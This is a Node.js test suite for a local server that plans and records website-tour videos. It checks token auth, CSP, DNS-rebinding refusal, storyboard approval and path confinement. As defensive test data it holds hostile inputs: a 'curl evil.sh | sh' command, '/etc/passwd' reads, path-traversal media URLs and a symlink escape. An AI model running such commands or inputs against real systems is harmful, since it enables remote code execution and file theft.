import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { makeTempDir } from '../../../test-utils/tmpdir.mjs';
import { saveConfig } from '../src/models.mjs';
import { startStudio } from '../src/server.mjs';
import { fakePlaywright, goodStoryboard, mockOllama, staticSite } from './studio-helpers.mjs';

const SITE = 'http://127.0.0.1:8088/'; // never fetched: the page probe fails and the mock model does the planning

async function boot({ replies = [], ollamaBase = 48370, env, fake = fakePlaywright(), models } = {}) {
  const ollama = await mockOllama({ replies, base: ollamaBase, ...(models ? { models } : {}) });
  const ws = makeTempDir('studio-srv-');
  const configPath = path.join(ws, 'studio.config.json');
  saveConfig(configPath, { providers: { ollama: { baseUrl: ollama.url, timeoutMs: 3000, tagsTimeoutMs: 1000 } }, allowPrivateNetwork: true });
  const tool = { runs: [] };
  const prev = process.env.STUDIO_ACCESS_TOKEN;
  if (env?.STUDIO_ACCESS_TOKEN) process.env.STUDIO_ACCESS_TOKEN = env.STUDIO_ACCESS_TOKEN; else delete process.env.STUDIO_ACCESS_TOKEN;
  const logs = [];
  const studio = await startStudio({
    port: 0, workspace: ws, configPath, log: (m) => logs.push(m),
    deps: {
      playwright: fake.playwright, mediaDir: '/fake/media', voiceAvailability: () => ({ available: false, reason: 'test: no voice' }),
      runTool: async (script, args, { env: e }) => { tool.runs.push(args); if (args[1] === 'srt') fs.writeFileSync(path.join(e.STUDIO_VIDEO_DIR, `${args[0]}.en.srt`), '1\n'); if (args[1] === 'vtt') fs.writeFileSync(path.join(e.STUDIO_VIDEO_DIR, `${args[0]}.en.vtt`), 'WEBVTT\n'); return ''; },
    },
  });
  if (prev === undefined) delete process.env.STUDIO_ACCESS_TOKEN; else process.env.STUDIO_ACCESS_TOKEN = prev;
  const call = async (p, { method = 'GET', body, token = studio.token, query = false, headers = {} } = {}) => {
    const url = studio.url + p + (query && token ? `${p.includes('?') ? '&' : '?'}token=${token}` : '');
    const res = await fetch(url, { method, headers: { ...(token && !query ? { authorization: `Bearer ${token}` } : {}), ...(body !== undefined ? { 'content-type': 'application/json' } : {}), ...headers }, body: body !== undefined ? JSON.stringify(body) : undefined });
    const text = await res.text();
    let json = null;
    try { json = JSON.parse(text); } catch { /* not json */ }
    return { status: res.status, headers: res.headers, text, json };
  };
  const stop = async () => { await studio.close(); await ollama.close(); };
  return { studio, ollama, ws, configPath, call, stop, fake, tool, logs };
}

const waitDone = async (call, id, ms = 10000) => {
  const end = Date.now() + ms;
  for (;;) {
    const { json } = await call('/api/jobs');
    const j = json.jobs.find((x) => x.id === id);
    if (j && !['queued', 'running'].includes(j.status)) return j;
    if (Date.now() > end) throw new Error(`job ${id} did not finish: ${JSON.stringify(j)}`);
    await new Promise((r) => setTimeout(r, 25));
  }
};

const chat = (t, sb, extra = {}) => t.call('/api/chat', { method: 'POST', body: { url: SITE, messages: [{ role: 'user', content: 'tour please' }], ...extra } });

test('the chat page is served without a token, self-contained, with a strict CSP; binds 127.0.0.1', async () => {
  const t = await boot({ ollamaBase: 48370 });
  try {
    assert.equal(t.studio.url.startsWith('http://127.0.0.1:'), true);
    const res = await fetch(t.studio.url + '/');
    assert.equal(res.status, 200);
    assert.match(res.headers.get('content-type'), /text\/html/);
    const csp = res.headers.get('content-security-policy');
    assert.match(csp, /default-src 'none'/);
    assert.match(csp, /script-src 'sha256-/);
    assert.doesNotMatch(csp, /unsafe-inline|unsafe-eval/);
    const html = await res.text();
    for (const id of ['chatForm', 'scenes', 'approve', 'settingsForm', 'cfgPlanner', 'jobList', 'video', 'url', 'msg']) assert.match(html, new RegExp(`id="${id}"`), id);
    assert.match(html, /name="viewport"/);
    assert.match(html, /prefers-color-scheme: dark/);
    assert.match(html, /:focus-visible/);
    assert.doesNotMatch(html, /<script[^>]+src=|<link[^>]+href=|@import|url\(\s*['"]?https?:/i, 'no CDN, no external script, style or font');
    assert.doesNotMatch(html, /innerHTML|eval\(|document\.write/);
    assert.equal((await fetch(t.studio.url + '/index.html')).status, 200);
    assert.equal(t.studio.token.length >= 24, true);
    assert.equal((await fetch(t.studio.url + '/health')).status, 200);
    assert.equal((await fetch(t.studio.url + '/nope')).status, 404);
  } finally { await t.stop(); }
});

test('the token is required on every /api route and /media: Bearer or ?token=, wrong or missing is 401, the banner shows it once', async () => {
  const t = await boot({ ollamaBase: 48372 });
  try {
    const routes = [['GET', '/api/config'], ['PUT', '/api/config'], ['GET', '/api/models'], ['GET', '/api/schema'], ['POST', '/api/chat'], ['POST', '/api/storyboard/approve'], ['GET', '/api/jobs'], ['GET', '/api/jobs/jabc/events'], ['GET', '/media/x.webm'], ['GET', '/api/nothing']];
    for (const [method, p] of routes) {
      const none = await t.call(p, { method, token: '', body: method === 'GET' ? undefined : {} });
      assert.equal(none.status, 401, `${method} ${p} without a token`);
      const wrong = await t.call(p, { method, token: 'x'.repeat(t.studio.token.length), body: method === 'GET' ? undefined : {} });
      assert.equal(wrong.status, 401, `${method} ${p} with a wrong token`);
      const short = await t.call(p, { method, token: 'x', body: method === 'GET' ? undefined : {} });
      assert.equal(short.status, 401, `${method} ${p} with a short token`);
    }
    assert.equal((await t.call('/api/config')).status, 200, 'Bearer');
    assert.equal((await t.call('/api/config', { query: true })).status, 200, '?token=');
    assert.equal(t.logs.filter((l) => l.includes(t.studio.token)).length, 1, 'the full token is written once, in the start banner');
    assert.match(t.logs[0], /Line Studio is running: http:\/\/127\.0\.0\.1:\d+\/\?token=/);
    assert.match(t.logs[1], new RegExp(t.studio.token.slice(0, 4) + '…'));
  } finally { await t.stop(); }
});

test('STUDIO_ACCESS_TOKEN sets the token, and the banner does not print it', async () => {
  const t = await boot({ ollamaBase: 48374, env: { STUDIO_ACCESS_TOKEN: 'fixed-token-for-test-123' } });
  try {
    assert.equal(t.studio.token, 'fixed-token-for-test-123');
    assert.equal((await t.call('/api/config')).status, 200);
    assert.equal((await t.call('/api/config', { token: 'fixed-token-for-test-124' })).status, 401);
    assert.equal(t.logs.some((l) => l.includes('fixed-token-for-test-123')), false);
  } finally { await t.stop(); }
});

test('a request with a foreign Host header is refused (DNS rebinding)', async () => {
  const t = await boot({ ollamaBase: 48376 });
  try {
    const status = await new Promise((resolve, reject) => {
      const req = http.request({ host: '127.0.0.1', port: t.studio.port, path: '/health', headers: { host: 'evil.example.com' } }, (res) => { res.resume(); resolve(res.statusCode); });
      req.on('error', reject); req.end();
    });
    assert.equal(status, 403);
  } finally { await t.stop(); }
});

test('GET /api/config, PUT /api/config, GET /api/models', async () => {
  const t = await boot({ ollamaBase: 48378, models: [{ name: 'qwen2.5:7b', size: 4 }, { name: 'llama3.2', size: 2 }] });
  try {
    const got = await t.call('/api/config');
    assert.equal(got.json.config.allowPrivateNetwork, true);
    assert.equal(got.json.config.providers.ollama.baseUrl, t.ollama.url);
    assert.deepEqual(got.json.fileOnly, ['tts.ttsCmd', 'tts.voiceSample']);
    assert.equal(got.json.voice.available, false);
    assert.equal(JSON.stringify(got.json).includes(t.ws), false, 'no filesystem path in the config answer');
    const models = await t.call('/api/models');
    assert.equal(models.json.reachable, true);
    assert.deepEqual(models.json.models.map((m) => m.name), ['qwen2.5:7b', 'llama3.2']);
    // change the planner, save, and see it on disk
    const put = await t.call('/api/config', { method: 'PUT', body: { models: { planner: 'qwen2.5:7b' }, recording: { pace: 2 } } });
    assert.equal(put.status, 200);
    assert.equal(put.json.config.models.planner, 'qwen2.5:7b');
    assert.equal(JSON.parse(fs.readFileSync(t.configPath, 'utf8')).models.planner, 'qwen2.5:7b');
    assert.equal(JSON.parse(fs.readFileSync(t.configPath, 'utf8')).recording.pace, 2);
    // named errors
    const bad = await t.call('/api/config', { method: 'PUT', body: { recording: { width: 5 } } });
    assert.equal(bad.status, 400);
    assert.equal(bad.json.error.code, 'CONFIG_BAD_RECORDING');
    const cmd = await t.call('/api/config', { method: 'PUT', body: { tts: { backend: 'cmd', ttsCmd: 'curl evil.sh | sh' } } });
    assert.equal(cmd.status, 400);
    assert.equal(cmd.json.error.code, 'CONFIG_FILE_ONLY');
    assert.equal(JSON.parse(fs.readFileSync(t.configPath, 'utf8')).tts.ttsCmd, '');
    assert.equal((await t.call('/api/config', { method: 'PUT', body: { tts: { voiceSample: '/etc/passwd' } } })).json.error.code, 'CONFIG_FILE_ONLY');
    const badJson = await fetch(t.studio.url + '/api/config', { method: 'PUT', headers: { authorization: `Bearer ${t.studio.token}` }, body: '{oops' });
    assert.equal(badJson.status, 400);
    // a model server that is down is reported, not thrown
    await t.call('/api/config', { method: 'PUT', body: { providers: { ollama: { baseUrl: 'http://127.0.0.1:1' } } } });
    const down = await t.call('/api/models');
    assert.equal(down.status, 200);
    assert.equal(down.json.reachable, false);
    assert.equal(down.json.error.code, 'MODEL_UNREACHABLE');
  } finally { await t.stop(); }
});

test('POST /api/chat returns a proposal (id, hash, storyboard) and starts nothing', async () => {
  const t = await boot({ replies: [JSON.stringify(goodStoryboard(SITE))], ollamaBase: 48380 });
  try {
    const r = await chat(t);
    assert.equal(r.status, 200, r.text);
    assert.match(r.json.proposal.id, /^[0-9a-f]{16}$/);
    assert.match(r.json.proposal.hash, /^[0-9a-f]{64}$/);
    assert.equal(r.json.proposal.fallback, false);
    assert.equal(r.json.proposal.storyboard.scenes.length, 2);
    assert.match(r.json.reply, /2 scenes/);
    assert.deepEqual((await t.call('/api/jobs')).json.jobs, []);
    assert.equal(t.fake.calls.length, 0, 'the browser was not started by a chat');
    // errors are typed
    assert.equal((await t.call('/api/chat', { method: 'POST', body: { url: 'file:///etc/passwd', messages: [{ role: 'user', content: 'x' }] } })).json.error.code, 'URL_SCHEME');
    assert.equal((await t.call('/api/chat', { method: 'POST', body: { messages: [] } })).json.error.code, 'URL_INVALID');
    assert.equal((await t.call('/api/chat', { method: 'POST', body: { url: SITE, messages: [] } })).json.error.code, 'NO_MESSAGES');
    t.ollama.queue.push('junk', 'junk', 'junk');
    const junk = await chat(t);
    assert.equal(junk.status, 422);
    assert.equal(junk.json.error.code, 'PLAN_INVALID');
    assert.equal(junk.json.error.attempts, 3);
  } finally { await t.stop(); }
});

test('POST /api/chat with an unreachable model returns a fallback proposal that says so', async () => {
  const t = await boot({ ollamaBase: 48382 });
  try {
    await t.call('/api/config', { method: 'PUT', body: { providers: { ollama: { baseUrl: 'http://127.0.0.1:1' } } } });
    const r = await chat(t);
    assert.equal(r.status, 200);
    assert.equal(r.json.proposal.fallback, true);
    assert.match(r.json.reply, /without a model/);
  } finally { await t.stop(); }
});

test('approve is the only way to record: it needs the proposal id AND its hash', async () => {
  const t = await boot({ replies: [JSON.stringify(goodStoryboard(SITE))], ollamaBase: 48384 });
  try {
    const sb = goodStoryboard(SITE);
    const noProposal = await t.call('/api/storyboard/approve', { method: 'POST', body: { storyboard: sb } });
    assert.equal(noProposal.status, 404);
    assert.equal(noProposal.json.error.code, 'UNKNOWN_PROPOSAL');
    assert.equal((await t.call('/api/storyboard/approve', { method: 'POST', body: { id: 'deadbeefdeadbeef', hash: 'x', storyboard: sb } })).status, 404);
    const { proposal } = (await chat(t)).json;
    const wrongHash = await t.call('/api/storyboard/approve', { method: 'POST', body: { id: proposal.id, hash: '0'.repeat(64) } });
    assert.equal(wrongHash.status, 409);
    assert.equal(wrongHash.json.error.code, 'HASH_MISMATCH');
    assert.equal((await t.call('/api/storyboard/approve', { method: 'POST', body: { id: proposal.id } })).status, 409, 'no hash');
    assert.equal((await t.call('/api/storyboard/approve', { method: 'POST', body: { hash: proposal.hash } })).status, 404, 'no id');
    assert.equal(t.fake.calls.length, 0, 'nothing recorded so far');
    assert.deepEqual((await t.call('/api/jobs')).json.jobs, []);
  } finally { await t.stop(); }
});

test('approve with the exact id and hash records: the job runs, streams events, and the files are served from the workspace', async () => {
  const t = await boot({ replies: [JSON.stringify(goodStoryboard(SITE))], ollamaBase: 48386 });
  try {
    const { proposal } = (await chat(t)).json;
    const a = await t.call('/api/storyboard/approve', { method: 'POST', body: { id: proposal.id, hash: proposal.hash } });
    assert.equal(a.status, 202, a.text);
    assert.equal(a.json.edited, false);
    assert.equal(a.json.hash, proposal.hash);
    const job = await waitDone(t.call, a.json.jobId);
    assert.equal(job.status, 'done', JSON.stringify(job));
    assert.equal(job.storyboardHash, proposal.hash);
    assert.match(job.final, /\.webm$/);
    assert.equal(job.stages.voice.status, 'skipped');
    assert.match(job.stages.voice.reason, /no voice/);
    assert.equal(job.stages.captions.status, 'done');
    // events: replayed to a late subscriber and ended
    const sse = await t.call(`/api/jobs/${a.json.jobId}/events`);
    assert.equal(sse.status, 200);
    assert.match(sse.headers.get('content-type'), /text\/event-stream/);
    assert.match(sse.text, /event: progress\ndata: .*"stage":"record","type":"start"/);
    assert.match(sse.text, /"stage":"record","type":"done"/);
    assert.match(sse.text, /event: end\ndata: .*"status":"done"/);
    // media: only from the outputs folder, by name, with Range
    const video = await t.call(`/media/${job.final}`, { query: true });
    assert.equal(video.status, 200);
    assert.equal(video.headers.get('content-type'), 'video/webm');
    assert.equal(video.text, 'fake-webm');
    const range = await t.call(`/media/${job.final}`, { query: true, headers: { range: 'bytes=0-3' } });
    assert.equal(range.status, 206);
    assert.equal(range.text, 'fake');
    assert.equal(range.headers.get('content-range'), 'bytes 0-3/9');
    assert.equal((await t.call(`/media/${job.files.captions}`, { query: true })).status, 200);
    assert.equal((await t.call(`/media/${job.files.srt}`, { query: true })).status, 200);
    assert.equal(fs.existsSync(path.join(fs.realpathSync(t.ws), 'videos', job.final)), true);
    // the persisted record survives a restart
    assert.equal(fs.existsSync(path.join(fs.realpathSync(t.ws), 'videos', `${job.slug}.job.json`)), true);
  } finally { await t.stop(); }
});

test('an edited storyboard is re-validated and re-hashed; an invalid edit starts nothing', async () => {
  const t = await boot({ replies: [JSON.stringify(goodStoryboard(SITE)), JSON.stringify(goodStoryboard(SITE))], ollamaBase: 48388 });
  try {
    const { proposal } = (await chat(t)).json;
    const edit = JSON.parse(JSON.stringify(proposal.storyboard));
    // 1. invalid edits: refused with named errors, no job, no browser
    const evil = JSON.parse(JSON.stringify(edit));
    evil.scenes[0].steps.push({ action: 'goto', url: 'file:///etc/passwd' });
    const r1 = await t.call('/api/storyboard/approve', { method: 'POST', body: { id: proposal.id, hash: proposal.hash, storyboard: evil } });
    assert.equal(r1.status, 422);
    assert.equal(r1.json.error.code, 'STORYBOARD_INVALID');
    assert.ok(r1.json.error.errors.some((e) => e.code === 'URL_SCHEME'));
    const script = JSON.parse(JSON.stringify(edit));
    script.scenes[1].steps.push({ action: 'eval', code: 'process.exit(1)' });
    assert.equal((await t.call('/api/storyboard/approve', { method: 'POST', body: { id: proposal.id, hash: proposal.hash, storyboard: script } })).json.error.errors[0].code, 'UNKNOWN_ACTION');
    const other = JSON.parse(JSON.stringify(edit));
    other.baseUrl = 'http://127.0.0.1:9999/';
    assert.equal((await t.call('/api/storyboard/approve', { method: 'POST', body: { id: proposal.id, hash: proposal.hash, storyboard: other } })).json.error.errors[0].code, 'BASE_URL_MISMATCH');
    const cross = JSON.parse(JSON.stringify(edit));
    cross.scenes[0].steps.push({ action: 'goto', url: 'http://127.0.0.1:9999/other-site' });
    assert.equal((await t.call('/api/storyboard/approve', { method: 'POST', body: { id: proposal.id, hash: proposal.hash, storyboard: cross } })).json.error.errors[0].code, 'URL_CROSS_ORIGIN');
    const nocap = JSON.parse(JSON.stringify(edit));
    delete nocap.scenes[1].caption;
    assert.equal((await t.call('/api/storyboard/approve', { method: 'POST', body: { id: proposal.id, hash: proposal.hash, storyboard: nocap } })).json.error.errors[0].code, 'CAPTION_REQUIRED');
    assert.deepEqual((await t.call('/api/jobs')).json.jobs, []);
    assert.equal(t.fake.calls.length, 0);
    // 2. a valid edit: accepted, new hash, and the RECORDED storyboard is the edited one
    const good = JSON.parse(JSON.stringify(edit));
    good.scenes[1].caption = 'A caption the human rewrote.';
    const ok = await t.call('/api/storyboard/approve', { method: 'POST', body: { id: proposal.id, hash: proposal.hash, storyboard: good } });
    assert.equal(ok.status, 202, ok.text);
    assert.equal(ok.json.edited, true);
    assert.notEqual(ok.json.hash, proposal.hash);
    const job = await waitDone(t.call, ok.json.jobId);
    assert.equal(job.status, 'done');
    assert.equal(job.edited, true);
    assert.equal(job.storyboardHash, ok.json.hash);
    const saved = JSON.parse(fs.readFileSync(path.join(fs.realpathSync(t.ws), 'videos', `${job.slug}.storyboard.json`), 'utf8'));
    assert.equal(saved.scenes[1].caption, 'A caption the human rewrote.');
    // 3. the proposal's own hash still identifies it: an approve carrying the edited hash instead is refused
    assert.equal((await t.call('/api/storyboard/approve', { method: 'POST', body: { id: proposal.id, hash: ok.json.hash } })).status, 409);
  } finally { await t.stop(); }
});

test('no route accepts a filesystem path from the client', async () => {
  const t = await boot({ replies: [JSON.stringify(goodStoryboard(SITE))], ollamaBase: 48390 });
  try {
    const outside = makeTempDir('studio-outside-');
    const inject = { path: outside, outDir: outside, workspace: outside, file: '/etc/passwd', dir: outside, slug: '../../escape', out: outside };
    const { proposal } = (await chat(t, null, inject)).json;
    const a = await t.call('/api/storyboard/approve', { method: 'POST', body: { id: proposal.id, hash: proposal.hash, ...inject } });
    assert.equal(a.status, 202);
    const job = await waitDone(t.call, a.json.jobId);
    assert.equal(job.status, 'done');
    assert.match(job.slug, /^\d{8}-\d{6}-tour-[0-9a-f]{4}$/, 'the slug is made by the server from the title');
    assert.deepEqual(fs.readdirSync(outside), [], 'nothing was written where the client pointed');
    assert.equal(fs.existsSync(path.join(fs.realpathSync(t.ws), '..', 'escape')), false);
    // media: names only
    for (const p of ['/media/..%2f..%2fetc%2fpasswd', '/media/%2fetc%2fpasswd', '/media/a/b.webm', '/media/', '/media/.hidden', '/media/x.sh', `/media/${job.slug}.job.json`, '/media/studio.config.json', '/media/missing.webm']) {
      const r = await t.call(p, { query: true });
      assert.equal(r.status, 404, p);
    }
    // a symlink inside videos that points out is not served
    fs.symlinkSync(path.join(outside, 'secret.webm'), path.join(fs.realpathSync(t.ws), 'videos', 'link.webm'));
    fs.writeFileSync(path.join(outside, 'secret.webm'), 'secret');
    assert.equal((await t.call('/media/link.webm', { query: true })).status, 404);
    assert.equal((await t.call('/api/jobs/..%2f..%2fx/events')).status, 404);
  } finally { await t.stop(); }
});

test('jobs run one at a time, in order', async () => {
  const t = await boot({ replies: [JSON.stringify(goodStoryboard(SITE))], ollamaBase: 48392 });
  try {
    const { proposal } = (await chat(t)).json;
    const body = { id: proposal.id, hash: proposal.hash };
    const [a, b] = await Promise.all([t.call('/api/storyboard/approve', { method: 'POST', body }), t.call('/api/storyboard/approve', { method: 'POST', body })]);
    assert.equal(a.status, 202); assert.equal(b.status, 202);
    const ja = await waitDone(t.call, a.json.jobId);
    const jb = await waitDone(t.call, b.json.jobId);
    assert.equal(ja.status, 'done'); assert.equal(jb.status, 'done');
    assert.notEqual(ja.slug, jb.slug);
    const list = (await t.call('/api/jobs')).json.jobs;
    assert.equal(list.length, 2);
  } finally { await t.stop(); }
});

test('a real site end to end through the server: static page, mock model, approve, a webm', { timeout: 120000 }, async (ctx) => {
  let playwright;
  try {
    const { loadPlaywright } = await import('../src/resolve.mjs');
    playwright = await loadPlaywright();
    const b = await playwright.chromium.launch({ headless: true });
    await b.close();
  } catch (e) { ctx.skip(`no Chromium (${String(e.message).split('\n')[0]})`); return; }
  const site = await staticSite();
  const ollama = await mockOllama({ replies: [JSON.stringify(goodStoryboard(site.url))], base: 48394 });
  const ws = makeTempDir('studio-e2e-');
  const configPath = path.join(ws, 'studio.config.json');
  saveConfig(configPath, { providers: { ollama: { baseUrl: ollama.url } }, allowPrivateNetwork: true, recording: { width: 640, height: 400, pace: 0.25, burnCaptions: true } });
  const studio = await startStudio({ port: 0, workspace: ws, configPath, log: () => {}, deps: { voiceAvailability: () => ({ available: false, reason: 'no voice in this test' }) } });
  const call = async (p, method = 'GET', body) => { const r = await fetch(studio.url + p, { method, headers: { authorization: `Bearer ${studio.token}`, ...(body ? { 'content-type': 'application/json' } : {}) }, body: body ? JSON.stringify(body) : undefined }); return { status: r.status, json: await r.json().catch(() => null) }; };
  try {
    const c = await call('/api/chat', 'POST', { url: site.url, messages: [{ role: 'user', content: 'tour the shop' }] });
    assert.equal(c.status, 200);
    const a = await call('/api/storyboard/approve', 'POST', { id: c.json.proposal.id, hash: c.json.proposal.hash, stages: { voice: false } });
    assert.equal(a.status, 202);
    const job = await waitDone(call, a.json.jobId, 90000);
    assert.equal(job.status, 'done', JSON.stringify(job));
    const videos = path.join(fs.realpathSync(ws), 'videos');
    assert.ok(fs.statSync(path.join(videos, job.files.video)).size > 2000);
    assert.deepEqual([...fs.readFileSync(path.join(videos, job.files.video)).subarray(0, 4)], [0x1a, 0x45, 0xdf, 0xa3]);
    const caps = JSON.parse(fs.readFileSync(path.join(videos, job.files.captions), 'utf8'));
    assert.deepEqual(caps.map((l) => l.text), ['This is the shop.', 'Say hello.']);
    const served = await fetch(`${studio.url}/media/${job.final}?token=${studio.token}`);
    assert.equal(served.status, 200);
    assert.equal(served.headers.get('content-type'), 'video/webm');
    assert.ok(site.hits.includes('/'));
  } finally { await studio.close(); await ollama.close(); await site.close(); }
});

test('the /editor page reloads without a token (it holds no secret); its API and media stay gated', async () => {
  const t = await boot({ ollamaBase: 48373 });
  try {
    const page = await t.call('/editor', { token: '' });
    assert.equal(page.status, 200, 'GET /editor without a token');
    assert.match(page.headers.get('content-type') || '', /text\/html/);
    assert.equal((await t.call('/api/editor/projects', { token: '' })).status, 401, 'the editor API needs the token');
    assert.equal((await t.call('/api/editor/projects')).status, 200, 'and works with it');
    assert.equal((await t.call('/editor', { method: 'POST', token: '', body: {} })).status, 401, 'only GET of the shell is open');
  } finally { await t.stop(); }
});
